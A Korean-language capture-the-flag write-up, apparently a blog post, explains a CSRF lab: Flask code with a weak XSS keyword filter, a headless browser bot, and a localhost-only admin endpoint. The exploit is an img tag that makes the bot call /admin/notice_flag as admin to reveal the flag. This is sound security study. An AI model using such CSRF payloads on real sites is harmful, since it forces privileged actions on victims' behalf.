### 문제 코드

#### read_url

```python
def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome("/chromedriver", options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        print(str(e))
        # return str(e)
        return False
    driver.quit()
    return True
```

해당 url을 방문합니다.

#

#### check_csrf

```python
def check_csrf(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)
```

입력받은 url과 이용자의 쿠키로 해당 url을 방문하는 read_url 함수를 호출합니다. 그래서 CSRF 취약점이 발생합니다.


#

#### app.route("/")

```python
@app.route("/")
def index():
    return render_template("index.html")
```

index.html 페이지를 랜더링 합니다.


#


#### app.route("/vuln")

```python
@app.route("/vuln")
def vuln():
    param = request.args.get("param", "").lower()
    xss_filter = ["frame", "script", "on"]
    for _ in xss_filter:
        param = param.replace(_, "*")
    return param
```

frame, script, on 태그가 들어오면 모두 *로 변환합니다.


#

#### app.route("/flag", methods=["GET", "POST"])

```python
@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html")
    elif request.method == "POST":
        param = request.form.get("param", "")
        if not check_csrf(param):
            return '<script>alert("wrong??");history.go(-1);</script>'

        return '<script>alert("good");history.go(-1);</script>'
```

사용자에게 입력창을 보여주고 입력 받은 내용을 인자로 check_csrf 함수를 호출합니다. 

#

#### @app.route("/memo")

```python
@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", None)
    if text:
        memo_text += text
    return render_template("memo.html", memo=memo_text)
```

memo.html에 memo_text를 넣어서 랜더링합니다.

#

#### app.route("/admin/notice_flag")

```python
@app.route("/admin/notice_flag")
def admin_notice_flag():
    global memo_text
    if request.remote_addr != "127.0.0.1":
        return "Access Denied"
    if request.args.get("userid", "") != "admin":
        return "Access Denied 2"
    memo_text += f"[Notice] flag is {FLAG}\n"
    return "Ok"
```

IP 주소가 localhost이고 userid가 admin이면 memo_text에 FLAG를 대입합니다.

⇾ 입력받은 URL을 확인하는 봇이 구현되어 있다고 하니 CSRF 취약점을 이용해서 봇이 /admin/notice_flag 페이지로 접속하게 하면 될거 같습니다. 이때 FLAG를 얻기 위해 userid는 admin으로 해줘야 합니다.


<br>


### 익스플로잇

/admin/notice_flag 페이지에 userid가 admin으로 접속하도록 공격 코드를 짜보면

```html
<img src="/admin/notice_flag?userid=admin">
```

#

공격 코드를 넣어보면

<img src="https://velog.velcdn.com/images/silvergun8291/post/ec50cf7b-6500-4a8f-96a8-0cc03848a157/image.png">

![](https://velog.velcdn.com/images/silvergun8291/post/436f5744-860d-44a4-ac07-c1e5a19be57c/image.png)

공격에 성공해서 FLAG가 출력되었습니다.


